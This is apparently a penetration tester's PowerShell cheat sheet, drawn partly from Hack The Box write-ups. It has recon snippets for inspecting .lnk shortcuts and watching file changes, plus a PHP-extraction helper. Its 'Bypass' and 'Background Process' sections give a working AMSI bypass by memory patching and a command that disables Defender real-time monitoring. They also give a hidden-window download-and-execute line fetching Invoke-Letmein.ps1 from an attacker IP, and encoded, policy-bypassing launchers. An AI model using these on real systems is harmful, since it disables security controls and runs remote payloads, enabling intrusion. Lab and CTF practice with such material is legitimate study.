# Util Powershell

## Recon

### Get Details About File

```powershell
ls -Filter *.lnk | % {
    $lnkPath = $_.FullName
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($lnkPath)
    
    [PSCustomObject]@{
        ShortcutPath = $lnkPath
        TargetPath   = $shortcut.TargetPath
        Arguments    = $shortcut.Arguments
        Description  = $shortcut.Description
        WorkingDirectory = $shortcut.WorkingDirectory
        IconLocation = $shortcut.IconLocation
    }

    $shortcutInfo.PSObject.Properties | % { Write-Output "$($_.Name): $($_.Value)" }
    Write-Output ""
}
```

### Watch File Changes

```powershell
$directory = "C:\Common Applications"
$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = $directory
$watcher.Filter = "*.lnk"
$watcher.IncludeSubdirectories = $true
$watcher.NotifyFilter = [System.IO.NotifyFilters]'FileName, LastAccess'
$accessLog = @{}
$action = {
    $filePath = $eventArgs.FullPath
    if ($accessLog.ContainsKey($filePath)) { $accessLog[$filePath]++ } else { $accessLog[$filePath] = 1 }
}
Register-ObjectEvent $watcher 'Changed' -Action $action
Register-ObjectEvent $watcher 'Created' -Action $action
Register-ObjectEvent $watcher 'Deleted' -Action $action
Register-ObjectEvent $watcher 'Renamed' -Action $action
$watcher.EnableRaisingEvents = $true
Write-Output "Monitoring .lnk file access in $directory for 2 minutes..."
Start-Sleep -Seconds 120
Write-Output "Total .lnk file accesses in 2 minutes:"
foreach ($file in $accessLog.Keys) {
    Write-Output "File: $file, Access Count: $($accessLog[$file])"
}
Unregister-Event -SourceIdentifier * -ErrorAction SilentlyContinue
$watcher.Dispose()
```

## Bypass

### Bypass AMSI

```powershell
# Author: Axura  
# URL: https://4xura.com/ctf/htb-writeup-mist/#toc-head-4  
  
$a = [Ref].Assembly.GetTypes() | ?{$_.Name -like '*siUtils'} 
$b = $a.GetFields('NonPublic,Static') | ?{$_.Name -like '*siContext'} 
[IntPtr]$c = $b.GetValue($null) 
[Int32[]]$d = @(0xff) 
[System.Runtime.InteropServices.Marshal]::Copy($d, 0, $c, 1)
```

### Disable Defender

Source: [https://liberiangeek.net/2023/11/how-to-disable-windows-defender-using-powershell](https://liberiangeek.net/2023/11/how-to-disable-windows-defender-using-powershell)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Background Process

Starts a new process, if webshell dies process won't
```
Start-Process powershell.exe -ArgumentList "-c IEX(IWR http://10.10.14.15/Invoke-Letmein.ps1 -UseBasicParsing)" -WindowStyle Hidden
```

Cmd version
```bash
# Run with cmd
cmd /c powershell.exe -ep bypass -e JABj....pAA==
# Run with cmd, background and aavoid hanging
start /b powershell.exe -ep bypass -e JABj....pAA==
# Run with cmd, fully detached
cmd /c start /b powershell.exe -w hidden -ep bypass -e JABj....pAA==
```

## Grep PHP

```powershell
function Extract-PhpBlocks($f) { [regex]::Matches((Get-Content $f -Raw), '(?s)<\?php.*?\?>') | ForEach-Object { $_.Value; "`n---`n" } }
```

```
PS> Extract-PhpBlocks alert_panel.php
<?php
session_start();
if (!(isset($_SESSION['password'])) && !(isset($_GET['auth']) && isset($_GET['username']) && isset($_GET['password']) && isset($_GET['alert']))) { exit(); }
?>
<snip>
```

Equivalent to this in Bash
```bash
sed -n '/<?php/,/?>/p'
```